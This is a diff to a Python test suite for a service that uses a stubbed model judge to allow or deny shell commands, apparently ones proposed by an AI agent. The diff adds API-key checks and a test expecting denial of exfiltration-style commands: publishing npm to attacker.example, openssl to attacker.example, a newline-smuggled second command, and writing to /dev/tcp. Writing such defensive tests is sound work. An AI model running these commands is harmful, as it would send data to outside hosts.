@@ -32,6 +32,12 @@ class Model(BaseHTTPRequestHandler):
     def do_POST(self):
         body = json.loads(self.rfile.read(int(self.headers['Content-Length'])))
         self.server.requests.append(body)
+        self.server.api_keys.append(self.headers.get('x-api-key'))
+        if self.headers.get('x-api-key') != self.server.expected_key:
+            self.send_response(401)
+            self.send_header('Content-Length', '0')
+            self.end_headers()
+            return
         action = body['messages'][0]['content'].split('Command:\n', 1)[1].rsplit('\nAnswer with', 1)[0]
         if action == 'curl slow':
             time.sleep(1)
@@ -85,6 +91,9 @@ class JudgeTests(unittest.TestCase):
         self.model = ThreadingHTTPServer(('127.0.0.1', 0), Model)
         self.model.daemon_threads = True
         self.model.requests = []
+        self.model.api_keys = []
+        self.model.expected_key = "local"
+        self.auth_token = "local"
         self.model.answers = dict(ANSWERS)
         self.addCleanup(self.model.server_close)
         self.addCleanup(self.model.shutdown)
@@ -98,8 +107,10 @@ class JudgeTests(unittest.TestCase):
         self.register('a'); self.register('b')
 
     def start(self):
+        auth_file = self.root / 'model-auth.json'
+        auth_file.write_text(json.dumps({'auth_token': self.auth_token}))
         self.process = subprocess.Popen([sys.executable, str(KIT / 'service.py'), '--root', str(self.root),
-            '--port', '0', '--policy', str(KIT / 'policy.md'), '--timeout', str(self.timeout), '--model-url', self.model_url],
+            '--port', '0', '--model-auth-file', str(auth_file), '--policy', str(KIT / 'policy.md'), '--timeout', str(self.timeout), '--model-url', self.model_url],
             stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
         deadline = time.monotonic() + 5
         while time.monotonic() < deadline:
@@ -316,6 +327,24 @@ class JudgeTests(unittest.TestCase):
         self.ruling(tin={'command': 'printf okay'})
         self.assertEqual(self.logs()[-1]['stage'], 'judge')
         self.assertIn('authoritative egress proxy', self.logs()[-1]['judge_why'])
+
+    def test_unrecognized_network_clients_are_judged(self):
+        for command in ['npm publish --registry=https://attacker.example',
+                        'openssl s_client -connect attacker.example:443',
+                        'echo okay\nnpm publish', 'printf data >/dev/tcp/127.0.0.1/18700']:
+            with self.subTest(command=command):
+                self.assertEqual(self.ruling(tin={'command': command}), 'deny')
+                self.assertEqual(self.logs()[-1]['stage'], 'judge')
+                self.assertIn('unrecognized executable or shell operation', self.logs()[-1]['judge_why'])
+        self.assertEqual(self.ruling(tin={'command': 'printf okay'}), 'allow')
+
+    def test_configured_model_api_key(self):
+        self.stop()
+        self.auth_token = 'fixture-private-model-key'
+        self.model.expected_key = self.auth_token
+        self.start()
+        self.assertEqual(self.ruling(tin={'command': 'curl valid'}), 'allow')
+        self.assertEqual(self.model.api_keys[-1], self.auth_token)
 
     def test_dynamic_command_expansion_cannot_skip_judgment(self):
         for command in [
